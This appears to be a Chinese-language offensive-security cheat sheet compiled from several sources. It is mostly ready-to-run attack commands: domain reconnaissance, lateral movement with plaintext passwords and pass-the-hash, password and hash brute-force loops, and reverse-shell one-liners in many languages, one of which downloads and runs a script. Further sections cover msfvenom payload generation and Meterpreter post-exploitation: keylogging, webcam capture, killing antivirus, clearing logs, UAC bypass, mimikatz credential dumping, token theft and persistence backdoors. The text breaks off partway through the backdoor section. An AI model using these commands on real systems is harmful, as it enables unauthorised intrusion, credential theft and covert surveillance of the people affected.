group /domain 域用户组信息Net view /domain 查询域Net view /domain:test 查询域内计算机Net accounts /domain 查询域中密码策略Net group /domain 查看域内所有用户组Net group &quot;Domain Controllers&quot; /domain 查看域控制器组Net group &quot;Domain computers&quot; /domain 查看域内所有计算机列表Net group &quot;Domain admins&quot; /domain 查看域内管理员用户Net user /domain kent active:yes 启用域账户Net user /domain kent active:no 禁用域账户Nltest /DCLIST:test 查看域中域控制器名Wmic useraccount get /all 用户详细信息Net group “Domain Admins” /domain 对应组下的账户信息nltest /domain_trusts 获取域信任信息net config workstation 了解本机的配置信息Netsh firewall show config 查看防火墙配置Netsh advfirewall set allprofiles state off关闭防火墙(windows server 2003后)Netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C:\\nc.exe&quot; 允许指定程序进入(windows server 2003后)Netsh advfirewall firewall add rule name=&quot;allow nc&quot; dir=out action=allow program=&quot;C:\\nc.exe&quot;允许指定程序退出(windows server 2003后)Netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow 允许3389连接(windows server 2003后)Reg query &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings&quot;查看端口代理配置信息Reg query &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot; /V PortNumber 查看远程桌面端口号 at&amp;schtasks&amp;sc横向使用明文密码登录到目标，需要445和139端口开启： 1234567891011121314151617net use \\\\192.168.2.148\\ipc$ password /user:test\\administratornet use \\\\192.168.2.148\\ipc$ password /user:administrator复制文件copy c:\\1.exe \\\\192.168.2.148\\c$at新建10:10分运行的定时作业at \\\\192.168.2.148 10:10 c:\\1.exeWindows server 2012及以上使用schtasks命令Schtasks /create /s 192.168.2.148 /ru “SYSTEM” /tn executefile /sc DAILY /tr c:/1.exe /FSchtasks /run /s 192.168.2.148 /tn executefile /iSchtasks /delete /s 192.168.2.148 /tn executefile /fsc \\\\192.168.210.107 create hacker binpath=&quot;c:\\shell1.exe&quot; #创建服务sc \\\\192.168.210.107 start hacker #启动hacker服务 impacket包横向命令下载https://github.com/maaaaz/impacket-examples-windowshttps://github.com/ropnop/impacket_static_binaries/releasesAtexec 1234需要445端口开启Atexec.exe hacker/administrator:abc123@192.168.202.148 &quot;whoami&quot;Atexec.exe -hashes :fac5d668099409cb6fa223a32ea493b6 hacker/administrator@192.168.202.148 &quot;whoami&quot; dcomexec 1234需要135端口开启dcomexec.exe hacker/administrator:abc123@192.168.202.148 &quot;whoami&quot;dcomexec.exe -hashes :fac5d668099409cb6fa223a32ea493b6 hacker/administrator@192.168.202.148 &quot;whoami&quot; psexec 12345678官方Psexec第一种利用方法：可以先有ipc链接，再用psexec运行相应的程序：Net use \\192.168.202.148\\ipc$ zxcvbnm123 /user:test\\AdministratorPsexec \\192.168.202.148 -accepteula -s cmd官方Psexec第二种利用方法：不用建立ipc连接，直接使用密码或hash进行传递Psexec \\192.168.202.148 -u Administrator -p zxcvbnm123 -s cmdPsExec -hashes :fac5d668099409cb6fa223a32ea493b6 test.com/Administrator@192.168.202.148 &quot;whoami&quot; (官方提供的exe执行不了) smbexec 123需要445端口开启Smbexec test/Administrator:zxcvbnm123@192.168.202.148Smbexec -hashes :fac5d668099409cb6fa223a32ea493b6 test/Administrator@192.168.202.148 wmi 1234567891011WMI利用135端口，支持明文和hash两种方式进行身份验证，且系统日志不记录。第一种：使用系统自带的WMIC明文传递执行相应命令，但执行的结果不回显（先管理员账户登录）Wmic /node:192.168.202.148 /user:Administrator /password:zxcvbnm123 process call create &quot;cmd.exe /c ipconfig &gt;C:/1.txt&quot;第二种：使用系统自带cscript明文传递执行反弹shell，执行结果有回显，现已被杀Cscript //nologo wmiexec.vbs /shell 192.168.202.148 Administrator zxcvbnm123第三种：使用第三方impacket套件中的Wmiexec进行明文或hash传递，执行结果有回显Wmiexec test/Administrator:zxcvbnm123@192.168.202.148 &quot;whoami&quot;Wmiexec -hashes :fac5d668099409cb6fa223a32ea493b6 test/Administrator@192.168.202.148 &quot;whoami&quot; 批量操作,需要保存为bat执行 12345678用已知密码和用户，批量连接ip:FOR /F %%i in (ips.txt) do net use \\%%i\\ipc$ “password” /user:hacker\\administrator已知用户和ip，批量连接密码(爆破密码)：FOR /F %%i in (pass.txt) do net use \\192.168.202.148\\ipc$ &quot;%%i&quot; /user:test\\administrator已知用户和ip，批量连接hash(爆破hash)：FOR /F %%i in (hash.txt) do atexec.exe -hashes :&quot;%%i&quot; test/administrator@192.168.202.148 &quot;whoami&quot; cme 批量 1proxychains4 ./cme smb 10.0.0.1/24 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -d xx.org -x &quot;net user&quot; 单独执行命令 1crackmapexec smb 192.168.10.11 -u Administrator -p &#x27;P@ssw0rd&#x27; -x whoami ldap喷洒 1cme ldap 10.11.12.211 -u &#x27;username&#x27; -p &#x27;password&#x27; --kdcHost 10.11.12.211 --users 反弹shellnc1nc -lvvp 4444 bash12bash -i &gt;&amp; /dev/tcp/172.16.1.130/4444 0&gt;&amp;1exec 5&lt;&gt;/dev/tcp/172.16.1.130/4444;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done perl1perl -e &#x27;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27; python1python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.31.41&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27; php1php -r &#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27; ruby1ruby -rsocket -e&#x27;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27; nc123nc -e /bin/sh 10.0.0.1 1234rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/fnc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999 java123r = Runtime.getRuntime()p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])p.waitFor() lua1lua -e &quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;10.0.0.1&#x27;,&#x27;1234&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot; powershell1powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&#x27;);Invoke-PowerShellTcp -Reverse -IPAddress 172.16.1.130 -port 4444 加密shell12mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.0.100:2333 &gt; /tmp/s; rm /tmp/s msf大全到处抄的 https://xz.aliyun.com/t/2536 https://www.freebuf.com/articles/web/270456.html https://saucer-man.com/information_security/79.html https://www.anquanke.com/post/id/235631 https://www.anquanke.com/post/id/164525 安装安装 1234# 安装curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall安装目录 # /opt/metasploit-framework/embedded/framework/ payload生成 Linux 1234反向连接：msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf正向连接：msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=&lt;Target IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf Windows 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe Mac 1msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho PHP 12msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.phpcat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\\n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php ASP 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp JSP 1msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp WAR 1msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war 执行方式：将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行： 1php shell.php 3.脚本shell Python 1msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py Bash 1msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh Perl 1msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl 执行方式：复制shell.py中的内容在linux命令行下执行： 1python -c &quot;exec(&#x27;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==&#x27;.decode(&#x27;base64&#x27;))&quot; 4.shellcodeLinux Based Shellcode 1msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt; Windows Based Shellcode 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt; Mac Based Shellcode 1msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt; Meterpreter基本命令首先需要先获取meterpreter： 12345678910use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset LHOST 192.168.81.160set ExitOnSession falseexploit -j -z # -j(计划任务下进行攻击，后台) -z(攻击完成不遇会话交互)jobs # 查看后台攻击任务 kill &lt;id&gt; # 停止某后台攻击任务 sessions -l # (查看会话)sessions -i 2 # 选择会话sessions -k 2 # 结束会话 如果先获取了cmd，比如利用ms17-010，默认使用的payload返回的就是cmd。这时候我们可以使用sessions-u 2来将cmdshell升级成meterpreter。 获取到了meterpreter，就可以进行后渗透了。 基本系统命令123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869# 会话管理background #将当前会话放置后台sessions # 查看会话sessions -i # 切换会话quit # 关闭当前的会话，返回msf终端# 系统设置sysinfo # 查看目标机系统信息idletime # 查看目标机闲置时间reboot/shutdown # 重启/关机# shellshell # 获得控制台权限irb # 进入ruby终端# 进程迁移getpid # 获取当前进程的pidps # 查看当前活跃进程migrate &lt;pid值&gt; #将Meterpreter会话移植到指定pid值进程中kill &lt;pid值&gt; #杀死进程migrate &lt;pid值&gt; #将Meterpreter会话移植到指定pid值进程中# 执行文件execute #在目标机中执行文件execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互# 摄像头命令webcam_list #查看摄像头列表webcam_chat # 查看摄像头接口webcam_snap #通过摄像头拍照webcam_stream #通过摄像头开启视频# uictl开关键盘/鼠标uictl [enable/disable] [keyboard/mouse/all] #开启或禁止键盘/鼠标uictl disable mouse #禁用鼠标uictl disable keyboard #禁用键盘# 远程桌面/截屏enumdesktops #查看可用的桌面getdesktop #获取当前meterpreter 关联的桌面screenshot #截屏use espia #或者使用espia模块截屏 然后输入screengrabrun vnc #使用vnc远程桌面连接# 键盘记录keyscan_start #开始键盘记录keyscan_dump #导出记录数据keyscan_stop #结束键盘记录# 添加用户，开启远程桌面# 开启rdp是通过reg修改注册表；添加用户是调用cmd.exe 通过net user添加；端口转发是利用的portfwd命令run post/windows/manage/enable_rdp #开启远程桌面run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户run post/windows/manage/enable_rdp FORWARD=true LPORT=6662 #将3389端口转发到6662# 关闭防病毒软件run killavrun post/windows/manage/killav# 修改注册表reg –h # 注册表命令帮助upload /usr/share/windows-binaries/nc.exe C:\\\\windows\\\\system32 #上传ncreg enumkey -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run #枚举run下的keyreg setval -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run -v lltest_nc -d &#x27;C:\\windows\\system32\\nc.exe -Ldp 443 -e cmd.exe&#x27; #设置键值reg queryval -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\Run -v lltest_nc #查看键值nc -v 192.168.81.162 443 #攻击者连接nc后门# 清理日志clearav #清除windows中的应用程序日志、系统日志、安全日志 文件系统命令123456789101112131415cat/ls/cd/rm # 基本命令search -f *pass* -d C:\\\\windows # 搜索文件 -h查看帮助getwd/pwd # 获取当前目录getlwd/lpwd # 操作攻击者主机 查看当前目录upload /tmp/hack.txt C:\\\\lltest # 上传文件download c:\\\\lltest\\\\lltestpasswd.txt /tmp/ # 下载文件edit c:\\\\1.txt # 编辑或创建文件 没有的话，会新建文件mkdir lltest2 # 只能在当前目录下创建文件夹rmdir lltest2 # 只能删除当前目录下文件夹lcd /tmp # 操作攻击者主机 切换目录# timestomp伪造文件时间戳timestomp C:// -h #查看帮助timestomp -v C://2.txt #查看时间戳timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt 网络命令12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# 基本ipconfig/ifconfignetstat –anoarpgetproxy #查看代理信息route #查看路由# portfwd端口转发portfwd add -l 6666 -p 3389 -r 127.0.0.1 # 将目标机的3389端口转发到本地6666端口rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #然后使用rdesktop来连接，-u 用户名 -p 密码# 添加路由# 方式一autoroute （deprecated）run autoroute –h #查看帮助run autoroute -s 192.168.2.0/24 #添加到目标环境网络run autoroute –p #查看添加的路由# 方式二post/multi/manage/autorouterun post/multi/manage/autoroute CMD=autoadd #自动添加到目标环境网络run post/multi/manage/autoroute CMD=print # 查看添加的路由(Specify the autoroute command (Accepted: add, autoadd, print, delete, default))# 然后可以利用arp_scanner、portscan等进行存活检测run arp_scanner -r 192.168.2.0/24run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24run auxiliary/scanner/portscan/tcp RHOSTS=192.168.2.0# autoroute添加完路由后，还可以利用msf自带的模块进行socks代理# msf提供了2个模块用来做socks代理。# auxiliary/server/socks_proxy# use auxiliary/server/socks_unc# 先background退出来，然后：use auxiliary/server/socks_proxyset srvhost 127.0.0.1set srvport 1080run# 然后vi /etc/proxychains.conf #添加 socks5 127.0.0.1 1080# 最后proxychains 使用Socks5代理访问# sniffer抓包use sniffersniffer_interfaces #查看网卡sniffer_start 2 #选择网卡 开始抓包sniffer_stats 2 #查看状态sniffer_dump 2 /tmp/lltest.pcap #导出pcap数据包sniffer_stop 2 #停止抓包 信息收集1234567891011121314# 信息收集的脚本位于：# modules/post/windows/gather# modules/post/linux/gather# 以下列举一些常用的run post/windows/gather/checkvm #是否虚拟机run post/linux/gather/checkvm #是否虚拟机run post/windows/gather/forensics/enum_drives #查看分区run post/windows/gather/enum_applications #获取安装软件信息run post/windows/gather/dumplinks #获取最近的文件操作run post/windows/gather/enum_ie #获取IE缓存run post/windows/gather/enum_chrome #获取Chrome缓存run post/windows/gather/enum_patches #补丁信息run post/windows/gather/enum_domain #查找定位域控run post/windows/gather/enum_logged_on_users #登录过的用户 提权1.getsystem提权getsystem工作原理：①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。③Windows服务已启动，导致与命名管道建立连接。④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。 1getsystem 2.bypassuac用户帐户控制（UAC）是微软在 Windows Vista 以后版本引入的一种安全机制，有助于防止对系统进行未经授权的更改。应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员专门给系统授予管理员级别的访问权限。UAC 可以阻止未经授权的应用程序进行自动安装，并防止无意中更改系统设置。 msf提供了如下几个模块帮助绕过UAC： 123456789101112131415msf5 auxiliary(server/socks5) &gt; search bypassuacMatching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/local/bypassuac 2010-12-31 excellent No Windows Escalate UAC Protection Bypass 1 exploit/windows/local/bypassuac_comhijack 1900-01-01 excellent Yes Windows Escalate UAC Protection Bypass (Via COM Handler Hijack) 2 exploit/windows/local/bypassuac_eventvwr 2016-08-15 excellent Yes Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key) 3 exploit/windows/local/bypassuac_fodhelper 2017-05-12 excellent Yes Windows UAC Protection Bypass (Via FodHelper Registry Key) 4 exploit/windows/local/bypassuac_injection 2010-12-31 excellent No Windows Escalate UAC Protection Bypass (In Memory Injection) 5 exploit/windows/local/bypassuac_injection_winsxs 2017-04-06 excellent No Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS 6 exploit/windows/local/bypassuac_sluihijack 2018-01-15 excellent Yes Windows UAC Protection Bypass (Via Slui File Handler Hijack) 7 exploit/windows/local/bypassuac_vbs 2015-08-22 excellent No Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability) 使用方法类似，运行后返回一个新的会话，需要再次执行getsystem获取系统权限 1234567891011121314151617181920212223242526# 示例meterpreter &gt; getuidServer username: SAUCERMAN\\TideSecmeterpreter &gt; background[*] Backgrounding session 4...msf5 exploit(multi/handler) &gt; use exploit/windows/local/bypassuacmsf5 exploit(windows/local/bypassuac) &gt; set SESSION 4SESSION =&gt; 4msf5 exploit(windows/local/bypassuac) &gt; run[-] Handler failed to bind to 192.168.81.160:4444:- -[-] Handler failed to bind to 0.0.0.0:4444:- -[*] UAC is Enabled, checking level...[+] UAC is set to Default[+] BypassUAC can bypass this setting, continuing...[+] Part of Administrators group! Continuing...[*] Uploaded the agent to the filesystem....[*] Uploading the bypass UAC executable to the filesystem...[*] Meterpreter stager executable 73802 bytes long being uploaded..[*] Sending stage (206403 bytes) to 192.168.81.154[*] Meterpreter session 5 opened (192.168.81.160:4444 -&gt; 192.168.81.154:1134) at 2019-06-12 06:31:11 -0700[-] Exploit failed [timeout-expired]: Timeout::Error execution expired[*] Exploit completed, but no session was created.# 然后返回新的meterpreter会话，继续执行getsystem本应该会提权成功# 然鹅这里失败了 3.内核漏洞提权 无论是linux还是windows都出过很多高危的漏洞，我们可以利用它们进行权限提升，比如windows系统的ms13-081、ms15-051、ms16-032、ms17-010等，msf也集成了这些漏洞的利用模块。 123456789101112131415161718192021222324252627282930313233343536373839meterpreter &gt; run post/windows/gather/enum_patches #查看补丁信息msf5 &gt; use exploit/windows/local/ms13_053_schlampereimsf5 &gt; set SESSION 2msf5 &gt; exploit# 示例meterpreter &gt; run post/windows/gather/enum_patches[+] KB2871997 is missing[+] KB2928120 is missing[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1meterpreter &gt; background[*] Backgrounding session 4...msf5 exploit(windows/local/bypassuac) &gt; search MS13-081Matching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/local/ms13_081_track_popup_menu 2013-10-08 average Yes Windows TrackPopupMenuEx Win32k NULL Pagemsf5 exploit(windows/local/bypassuac) &gt; use exploit/windows/local/ms13_081_track_popup_menumsf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; set session 4session =&gt; 4msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; exploit[!] SESSION may not be compatible with this module.[-] Handler failed to bind to 192.168.81.160:4444:- -[-] Handler failed to bind to 0.0.0.0:4444:- -[-] Exploit aborted due to failure: no-target: Running against 64-bit systems is not supported[*] Exploit completed, but no session was created.# 然鹅失败了，摸摸头 获取凭证在内网环境中，一个管理员可能管理多台服务器，他使用的密码有可能相同或者有规律，如果能够得到密码或者hash，再尝试登录内网其它服务器，可能取得意想不到的效果。 1.使用mimikatz 1234567891011121314151617181920212223242526272829303132333435363738load mimikatz #help mimikatz 查看帮助wdigest #获取Wdigest密码mimikatz_command -f samdump::hashes #执行mimikatz原始命令mimikatz_command -f sekurlsa::searchPasswords# 示例meterpreter &gt; load mimikatzLoading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to &#x27;load kiwi&#x27; instead?Success.meterpreter &gt; wdigest[!] Not currently running as SYSTEM[*] Attempting to getprivs ...[+] Got SeDebugPrivilege.[*] Retrieving wdigest credentialswdigest credentials===================AuthID Package Domain User Password------ ------- ------ ---- --------0;997 Negotiate NT AUTHORITY LOCAL SERVICE 0;996 Negotiate WORKGROUP SAUCERMAN$ 0;48748 NTLM 0;999 NTLM WORKGROUP SAUCERMAN$ 0;476238 NTLM SAUCERMAN TideSec 1234560;476209 NTLM SAUCERMAN TideSec 123456meterpreter &gt; mimikatz_command -f samdump::hashesOrdinateur : saucermanBootKey : 691cff33caf49e933be97fcee370256aRegOpenKeyEx SAM : (0x00000005) �ݿ�\u0002 Erreur lors de l&#x27;exploration du registremeterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords[0] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[1] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[2] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[3] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[4] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[5] &#123; TideSec ; SAUCERMAN ; 123456 &#125; 使用meterpreter的run hashdump命令 12345678910111213141516171819202122meterpreter &gt; run hashdump[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...][*] Obtaining the boot key...[*] Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a.../opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated[*] Obtaining the user list and keys...[*] Decrypting user keys.../opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated[*] Dumping password hints...TideSec:&quot;123456&quot;[*] Dumping password hashes...Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4::: 3.post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump 从上面也可以看出官方推荐post/windows/gather/smart_hashdump 1234567891011121314151617meterpreter &gt; run post/windows/gather/smart_hashdump[*] Running module against SAUCERMAN[*] Hashes will be saved to the database if one is connected.[+] Hashes will be saved in loot in JtR password file format to:[*] /home/ubuntu/.msf4/loot/20190612084715_default_192.168.81.154_windows.hashes_439550.txt[*] Dumping password hashes...[*] Running as SYSTEM extracting hashes from registry[*] Obtaining the boot key...[*] Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...[*] Obtaining the user list and keys...[*] Decrypting user keys...[*] Dumping password hints...[+] TideSec:&quot;123456&quot;[*] Dumping password hashes...[+] Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::[+] TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4::: 4.powerdump同 hashdump，但失败了 12345678meterpreter &gt; run powerdump[*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...[*] Running PowerDump to extract Username and Password Hashes...[*] Uploaded PowerDump as 69921.ps1 to %TEMP%...[*] Setting ExecutionPolicy to Unrestricted...[*] Dumping the SAM database through PowerShell...[-] Could not execute powerdump: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: The system cannot find the file specified. 假冒令牌在用户登录windows操作系统时，系统都会给用户分配一个令牌(Token)，当用户访问系统资源时都会使用这个令牌进行身份验证，功能类似于网站的session或者cookie。 msf提供了一个功能模块可以让我们假冒别人的令牌，实现身份切换，如果目标环境是域环境，刚好域管理员登录过我们已经有权限的终端，那么就可以假冒成域管理员的角色。 123456789101112# 1.incognito假冒令牌use incognito #help incognito 查看帮助list_tokens -u #查看可用的tokenimpersonate_token &#x27;NT AUTHORITY\\SYSTEM&#x27; #假冒SYSTEM token或者impersonate_token NT\\ AUTHORITY\\\\SYSTEM #不加单引号 需使用\\\\execute -f cmd.exe -i –t # -t 使用假冒的token 执行或者直接shellrev2self #返回原始token# 2.steal_token窃取令牌steal_token &lt;pid值&gt; #从指定进程中窃取token 先ps,找域控进程drop_token #删除窃取的token 植入后门Meterpreter仅仅是在内存中驻留的Shellcode，只要目标机器重启就会丧失控制权，下面就介绍如何植入后门，维持控制。 1.persistence启动项后门 路径：metasploit&#x2F;scripts&#x2F;meterpreter&#x2F;persistence 原理是在C:\\Users***\\AppData\\Local\\Temp\\目录下，上传一个vbs脚本，在注册表HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\加入开机启动项，很容易被杀软拦截，官方不推荐 1234567891011121314151617run persistence –h #查看帮助run persistence -X -i 5 -p 4444 -r 192.168.81.160#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip# 示例meterpreter &gt; run persistence -X -i 5 -p 4444 -r 192.168.81.160[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.[!] Example: run post/windows/manage/persistence_exe OPTION=value [...][*] Running Persistence Script[*] Resource file for cleanup created at /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.4235/SAUCERMAN_20190612.4235.rc[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.81.160 LPORT=4444[*] Persistent agent script is 99630 bytes long[+] Persistent Script written to C:\\Users\\TideSec\\AppData\\Local\\Temp\\qexwcMF.vbs[*] Executing script C:\\Users\\TideSec\\AppData\\Local\\Temp\\qexwcMF.vbs[+] Agent executed with PID 3540[*] Installing into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\qrsXZuPqVbEgua[+] Installed into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\qrsXZuPqVbEgua 能实现同样功能的脚本还有：exploit&#x2F;windows&#x2F;local&#x2F;persistence 2.metsvc服务后门 在C:\\Users\\AppData\\Local\\Temp\\目录下，上传一个vbs脚本在注册表HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\加入开机启动项。通过服务启动，需要管理员权限，官方不推荐使用，运行失败* 123456789101112131415161718192021222324run metsvc –A #自动安装后门# 示例meterpreter &gt; run metsvc –A[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.[!] Example: run post/windows/manage/persistence_exe OPTION=value 